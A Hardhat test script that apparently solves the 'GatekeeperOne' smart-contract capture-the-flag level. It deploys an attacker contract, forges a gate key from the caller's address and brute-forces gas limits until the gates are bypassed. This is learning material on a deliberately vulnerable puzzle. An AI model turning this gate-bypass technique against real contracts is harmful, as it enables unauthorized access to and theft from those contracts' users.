const { ethers } = require("hardhat");
require('dotenv').config()

describe("GatekeeperOne", function () {
  it("GatekeeperOne", async function () {
    const GatekeeperOne = await ethers.getContractFactory("GatekeeperOne");
    const gatekeeper_one = GatekeeperOne.attach(process.env.GATEKEEPER_ONE_ADDR);
    console.log(`entrant: ${await gatekeeper_one.entrant()}`);

    const GatekeeperOneHacker = await ethers.getContractFactory("GatekeeperOneHacker");
    const gatekeeper_one_hacker = await GatekeeperOneHacker.deploy();
    await gatekeeper_one_hacker.deployed();

    const txOrigin = (await ethers.getSigners())[0].address;
    console.log(`txOrigin: ${txOrigin}`);
    const key = `0x112233440000${txOrigin.slice(38)}`;
    const tryGas = 900000;
    for(let i = 0; i < 8191; i++) {
      try {
        console.log('try gasLimit:', tryGas + i)
        let tx = await gatekeeper_one_hacker.attack(gatekeeper_one.address, key, tryGas + i, {
          gasLimit: 1000000,
        });
        await tx.wait();
        console.log(`entrant: ${await gatekeeper_one.entrant()}`);
        break;
      } catch (error) {
        continue;
      }
    }
    console.log(`entrant: ${await gatekeeper_one.entrant()}`);
  });
});
